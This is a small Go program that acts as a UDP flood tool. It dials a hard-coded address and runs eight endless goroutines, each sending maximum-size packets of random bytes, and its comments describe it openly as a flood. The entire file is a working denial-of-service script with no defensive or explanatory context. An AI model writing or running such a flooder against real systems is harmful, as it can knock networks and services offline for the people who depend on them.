package main

import (
	"fmt"
	"math/rand"
	"net"
)

func main() {
	addr := "192.168.0.10:30000" // Server's Address
	buf := make([]byte, 65507)

	conn, err := net.Dial("udp", addr) // Dial as UDP
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("Flood in %s for 8 threads\n", addr) // Floods with multi-threading
	for i := 0; i < 8; i++ {
		go func() {
			for {
				rand.Read(buf)            // Set sending buffer as a random packet
				_, err := conn.Write(buf) // Send that bytes
				if err != nil {
					fmt.Println(err)
				}
			}
		}()
	}
	<-make(chan bool, 1)
}
